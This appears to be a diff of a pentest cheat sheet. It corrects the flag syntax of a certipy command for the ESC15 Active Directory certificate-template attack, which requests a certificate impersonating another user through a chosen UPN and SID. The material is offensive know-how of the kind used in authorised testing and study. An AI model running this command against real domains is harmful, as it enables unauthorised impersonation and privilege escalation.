@@ -883,7 +883,7 @@ u.objectid ENDS WITH "-548" RETURN q
   <summary> ESC15 </summary> 
 
   ```shell
-  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>l --application-policies 'Client Authentication'
+  certipy req -u <AD_user>\@<domain> -p <password> -dc-ip <Domain_Controller_IP> -ca <Certificate_authorities> -target <target_server> -template <vulnerable_template> -upn AD_user@<domain> -sid <user_SID>l -application-policies 'Client Authentication'
   ```
 </details> 
 
